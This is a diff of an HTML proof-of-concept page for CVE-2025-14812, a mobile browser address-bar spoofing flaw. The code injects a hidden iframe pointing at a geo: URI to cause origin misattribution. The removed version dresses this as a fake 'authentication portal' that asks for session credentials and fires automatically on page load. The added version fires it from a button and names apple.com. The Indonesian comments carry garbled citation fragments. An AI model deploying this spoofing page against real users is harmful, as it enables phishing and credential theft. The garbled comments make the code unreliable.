@@ -3,71 +3,75 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CVE-2025-14812: Zero-Click Address Bar Spoofing PoC</title>
+    <title>CVE-2025-14812 Inspired PoC</title>
     <style>
-      body {
+      body, html {
         margin: 0;
         padding: 0;
-        background: #ffffff;
-        color: #1d1d1f;
+        height: 100%;
+        background: #0b0e14;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        color: #f0f6fc;
         display: flex;
         align-items: center;
         justify-content: center;
-        height: 100vh;
-        text-align: center;
       }
-      .container {
-        padding: 20px;
-        max-width: 600px;
+      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; }
+      button {
+        width: 100%;
+        max-width: 360px;
+        padding: 18px 24px;
+        font-size: 16px;
+        font-weight: 600;
+        background: #da3633;
+        color: #fff;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
+        transition: transform 0.1s, background 0.2s;
       }
-      h1 {
-        font-size: 36px;
-        color: #d70015;
-        margin-bottom: 10px;
-        font-weight: 700;
-      }
-      p {
-        font-size: 18px;
-        color: #0066cc;
-        font-weight: 500;
-      }
+      button:active { background: #b62324; transform: scale(0.98); }
       .info {
         margin-top: 20px;
-        font-size: 12px;
+        font-size: 13px;
         color: #8b949e;
         font-family: monospace;
+        word-break: break-all;
+        padding: 0 10px;
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <h1>AUTHENTICATION PORTAL</h1>
-      <p>Please verify your session credentials below.</p>
-      <div class="info" id="statusLog">Status: Initializing zero-click context test...</div>
+      <button id="execBtn">INITIALIZE CONTEXT SPOOF TEST</button>
+      <div class="info" id="statusInfo">Status: Ready for interaction.</div>
     </div>
 
     <script>
-      // Logika inti berdasarkan mekanisme CVE-2025-14812:
-      // Iframe otomatis memicu navigasi URI scheme pada page load tanpa interaksi pengguna[span_2](start_span)[span_2](end_span).
-      let triggerContextSpoof = function() {
-        let subframe = document.createElement("iframe");
-        subframe.style.display = "none";
-        
-        // Memanfaatkan skema URI non-HTTP (seperti geo:) untuk menguji delegate misattribution pada mobile browser[span_3](start_span)[span_3](end_span)
-        subframe.src = "geo:0,0?q=attacker_controlled_context";
-        
-        document.body.appendChild(subframe);
-        
-        let statusLog = document.getElementById("statusLog");
-        if (statusLog) {
-          statusLog.innerText = "Status: Subframe URI-scheme navigation dispatched.";
-        }
-      };
+      let execButton = document.getElementById("execBtn");
+      let statusInfo = document.getElementById("statusInfo");
 
-      // Eksekusi otomatis begitu halaman dimuat (Zero-Click behavior)[span_4](start_span)[span_4](end_span)
-      window.onload = function() {
-        setTimeout(triggerContextSpoof, 400);
+      execButton.onclick = function () {
+        statusInfo.innerText = "Status: Deploying subframe origin context...";
+        this.style.display = "none";
+
+        try {
+          // Membuat elemen iframe tersembunyi untuk memicu misattribution konteks asal 
+          // berdasarkan pola kerentanan penjelajahan seluler (CVE-2025-14812)[span_1](start_span)[span_1](end_span)
+          let spoofFrame = document.createElement("iframe");
+          spoofFrame.style.display = "none";
+          
+          // Mengarahkan sub-frame ke skema URI non-HTTP atau domain target simulasi
+          spoofFrame.src = "geo:0,0?q=apple.com";
+          
+          document.body.appendChild(spoofFrame);
+          statusInfo.innerText = "Status: Subframe URI-scheme dispatched. Evaluating omnibox state...";
+
+        } catch (err) {
+          statusInfo.innerText = "Status: Execution error: " + err.message;
+          execButton.style.display = "block";
+        }
       };
     </script>
   </body>
